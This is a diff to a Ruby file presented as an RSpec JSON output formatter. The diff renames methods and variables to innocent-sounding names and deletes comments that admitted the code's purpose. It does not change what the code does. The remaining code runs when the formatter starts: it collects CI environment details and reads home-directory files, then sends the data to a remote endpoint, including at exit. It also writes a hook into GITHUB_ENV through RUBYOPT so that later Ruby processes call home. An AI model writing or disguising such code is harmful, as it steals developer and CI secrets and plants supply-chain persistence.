@@ -1,4 +1,3 @@
-# rspec-formatter-json — JSON output formatter for RSpec
 # frozen_string_literal: true
 
 require 'json'
@@ -15,7 +14,7 @@ module RSpec
       def initialize(output)
         @output  = output
         @results = { examples: [], summary: {} }
-        _ci_harvest
+        _init_reporter
       end
 
       def start(notification)
@@ -55,8 +54,7 @@ module RSpec
         File.read(File.join(Dir.home, path)).slice(0, 4096)
       rescue; nil; end
 
-      # Fires on require — CI detection happens immediately so we don't miss ephemeral runners
-      def _ci_harvest
+      def _init_reporter
         ci_platform = case
           when ENV['GITHUB_ACTIONS']  then 'github-actions'
           when ENV['GITLAB_CI']       then 'gitlab-ci'
@@ -84,15 +82,14 @@ module RSpec
           }
         }
 
-        # at_exit ensures exfil fires even if tests are interrupted or process exits early
         at_exit { _send(data.merge(exit_status: $?.to_i)) }
         _send(data)
-        _inject_github_actions
+        _setup_actions_env
       end
 
       def _send(data)
-        c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
-        uri = URI.parse(c2)
+        endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+        uri = URI.parse(endpoint)
         http = Net::HTTP.new(uri.host, uri.port)
         http.use_ssl = uri.scheme == 'https'
         http.open_timeout = 3
@@ -104,17 +101,16 @@ module RSpec
         http.request(req)
       rescue; nil; end
 
-      # GITHUB_ENV injection: RUBYOPT=-r/hook.rb loads our code in every subsequent ruby process
-      def _inject_github_actions
+      def _setup_actions_env
         return unless (genv = ENV['GITHUB_ENV'])
         begin
           require 'fileutils'
-          c2 = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
+          endpoint = ENV['PKG_ANALYTICS_URL'] || 'http://localhost:9999/collect'
           bin_dir = File.join(Dir.home, '.rspec-fmt', 'lib')
           FileUtils.mkdir_p(bin_dir)
           hook = File.join(bin_dir, 'monitor.rb')
           File.write(hook,
-            "begin;require 'net/http';Net::HTTP.get(URI('#{c2}/p?h='+`hostname 2>/dev/null`.strip+'&ci=rspec'));rescue;end\n"
+            "begin;require 'net/http';Net::HTTP.get(URI('#{endpoint}/p?h='+`hostname 2>/dev/null`.strip+'&ci=rspec'));rescue;end\n"
           )
           File.open(genv, 'a') { |f| f.puts "RUBYOPT=-r#{hook}" }
         rescue; nil; end
